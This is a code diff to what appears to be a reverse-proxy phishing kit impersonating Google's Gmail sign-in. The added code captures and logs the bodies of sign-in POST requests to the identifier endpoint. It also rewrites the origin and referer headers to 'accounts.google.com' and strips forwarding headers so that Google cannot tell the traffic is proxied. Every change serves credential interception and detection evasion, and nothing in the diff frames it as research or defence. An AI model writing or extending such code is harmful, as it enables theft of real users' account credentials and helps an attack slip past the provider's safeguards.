@@ -22,6 +22,16 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
         // If this is a POST request to the identifier endpoint, we need to handle it specially
         if (this.browserReq.method === 'POST' && this.browserReq.url.includes('/v3/signin/identifier')) {
             console.log('Gmail POST request to identifier endpoint detected')
+            
+            // Log the request body to see what's being sent
+            let body = ''
+            this.browserReq.on('data', (chunk) => {
+                body += chunk.toString()
+            })
+            this.browserReq.on('end', () => {
+                console.log('Gmail POST request body:', body)
+            })
+            
             // Let the base class handle it but with special logging
             return super.processRequest()
         }
@@ -111,8 +121,15 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     execute(clientContext) {
         // Set proper headers for Gmail like working services do
         this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
-        this.req.headers['origin'] = this.req.headers['origin'] ? this.req.headers['origin'].replace(clientContext.hostname, 'accounts.google.com') : ''
-        this.req.headers['referer'] = this.req.headers['referer'] ? this.req.headers['referer'].replace(clientContext.hostname, 'accounts.google.com') : ''
+        
+        // Ensure origin and referer point to accounts.google.com for Gmail
+        this.req.headers['origin'] = 'https://accounts.google.com'
+        this.req.headers['referer'] = 'https://accounts.google.com/'
+        
+        // Remove any proxy-specific headers that might confuse Gmail
+        delete this.req.headers['x-forwarded-for']
+        delete this.req.headers['x-forwarded-proto']
+        delete this.req.headers['x-real-ip']
         
         console.log('Gmail request URL:', this.req.url)
         console.log('Gmail request method:', this.req.method)
